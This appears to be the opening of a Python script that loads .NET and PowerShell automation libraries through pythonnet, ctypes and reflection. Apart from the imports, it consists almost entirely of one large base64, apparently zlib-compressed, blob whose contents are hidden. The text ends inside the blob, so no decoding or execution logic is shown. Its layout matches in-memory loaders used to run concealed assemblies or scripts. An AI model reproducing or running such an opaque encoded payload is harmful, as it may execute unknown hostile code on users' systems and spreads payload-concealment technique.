import base64
import zlib
import argparse
import clr
import ctypes
from ctypes import *
import System
from System import Array, IntPtr, UInt32
from System.Reflection import Assembly
import System.Reflection as Reflection

# Ensure necessary .NET references are added
clr.AddReference("System.Management.Automation")

from System.Management.Automation import Runspaces, RunspaceInvoke
from System.Runtime.InteropServices import Marshal

base64_str = "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